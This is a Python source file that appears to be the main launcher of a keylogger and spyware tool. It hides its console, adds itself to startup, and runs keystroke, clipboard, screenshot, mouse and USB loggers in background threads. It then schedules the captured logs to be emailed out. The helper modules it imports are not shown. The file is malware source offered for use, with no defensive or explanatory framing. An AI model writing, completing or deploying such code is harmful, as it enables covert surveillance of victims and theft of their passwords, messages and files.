import os
import time
from threading import Thread
from modules import keystroke_logger, clipboard_logger, screenshot_capture, mouse_tracker, email_sender, usb_extractor, stealth_mode

def create_user_log_folder():
    username = os.getlogin()
    user_folder = os.path.join("logs", username)
    screenshot_folder = os.path.join(user_folder, "screenshots")
    os.makedirs(screenshot_folder, exist_ok=True)
    return user_folder, screenshot_folder

def run_all():
    user_folder, screenshot_folder = create_user_log_folder()

    # Start each logger in a separate thread
    Thread(target=keystroke_logger.start_logger, args=(user_folder,), daemon=True).start()
    Thread(target=clipboard_logger.start_logger, args=(user_folder,), daemon=True).start()
    Thread(target=screenshot_capture.start_logger, args=(screenshot_folder,), daemon=True).start()
    Thread(target=mouse_tracker.start_logger, args=(user_folder,), daemon=True).start()

    # Start USB extraction (optional)
    Thread(target=usb_extractor.extract_on_usb, args=(user_folder,), daemon=True).start()

    # Delay email sending to ensure logs are generated
    def delayed_email_sender():
        time.sleep(60)  # Wait for log files to be created
        email_sender.schedule_email_sending()

    Thread(target=delayed_email_sender, daemon=True).start()

if __name__ == "__main__":
    stealth_mode.hide_console()  # Comment this during debugging
    stealth_mode.add_to_startup()
    run_all()

    # Keep the script running
    while True:
        time.sleep(1)
